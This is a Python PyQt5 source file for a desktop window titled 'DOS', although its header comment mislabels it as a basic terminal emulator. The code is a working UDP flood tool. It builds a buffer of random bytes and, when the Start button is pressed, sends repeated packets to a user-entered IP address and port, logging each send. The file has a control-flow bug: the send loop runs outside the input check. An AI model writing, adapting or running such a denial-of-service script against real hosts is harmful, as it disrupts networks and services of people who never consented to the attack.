# very basic terminal emulator in pyqt
# https://pythonbasics.org/pyqt/

from PyQt5 import QtWidgets, uic
from PyQt5.QtCore import pyqtSlot,QProcess,QTimer
from PyQt5.QtWidgets import QMessageBox,QApplication
from PyQt5.QtWidgets import QMessageBox, QDialog, QFileDialog
from PyQt5.QtGui import QIcon
import PyQt5
import sys
import os
from dos import dos
import time
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

class Dos(QtWidgets.QMainWindow):
    def __init__(self):
        super(Dos, self).__init__()
        uic.loadUi('dos.ui', self)
        self.setWindowIcon(QIcon('1464646-200.png'))
        self.setWindowTitle('DOS')
        # self.lineEdit.returnPressed.connect(self.doCMD)
        # self.pushButtonInstall.clicked.connect(self.onClick)
        self.startBtn.clicked.connect(self.on_startClick)
        self.backBtn.clicked.connect(self.on_backClick)
        self.print.setReadOnly(True)
        self.resetBtn.clicked.connect(self.on_resetClick)

    @pyqtSlot()
    def on_resetClick(self):
        self.url.setText('')
        #self.port.setText('')
        self.print.appendPlainText('')


    @pyqtSlot()
    def on_backClick(self):
        from startUI import Start

        self.f=Start()
        self.f.show()
        self.hide()

    # @pyqtSlot()
    # def on_startClick(self):
    #
    #     self.print.appendPlainText("Executing...")
    #     # self.timer = QTimer(self)
    #     # self.timer.timeout.connect(self.on_startClicks)
    #     # self.timer.start(0)
    #     self.p = QProcess()  # Keep a reference to the QProcess (e.g. on self) while it's running.
    #     self.p.readyReadStandardOutput.connect(self.handle_stdout)
    #     self.p.readyReadStandardError.connect(self.handle_stderr)
    #     self.p.stateChanged.connect(self.handle_state)
    #     self.p.finished.connect(self.process_finished)  # Clean up once complete.
    #     self.p.start("python3", ['dummy_script.py'])

    def on_startClick(self):

        if str(self.port.text())=='' or not int(self.port.text()):
            self.print.appendPlainText('IP and Port both are required')
        else:
            self.print.appendPlainText('Executing')
            ip = str(self.url.text())
            port = int(self.port.text())
            sent = 0
        
        for i in range(1,50):
                state=sock.sendto(bytes, (ip, port))
                sent = sent +1
                print(port,sent)
                self.print.appendPlainText("Sent %s packet to %s throught port:%s" % (sent, ip, port))
                self.print.appendPlainText("Status: %s" % state )

           
            # for i in range(1,5):
            #     state=sock.sendto(bytes, (ip, port))
            #     sent = sent +1
            #     print(port,sent)
            #     self.print.appendPlainText("Sent %s packet to %s throught port:%s" % (sent, ip, port))
            #     self.print.appendPlainText("Status: %s" % state )

if __name__ == '__main__':

    app = QtWidgets.QApplication([])
    win = Dos()

    win.show()
    sys.exit(app.exec())
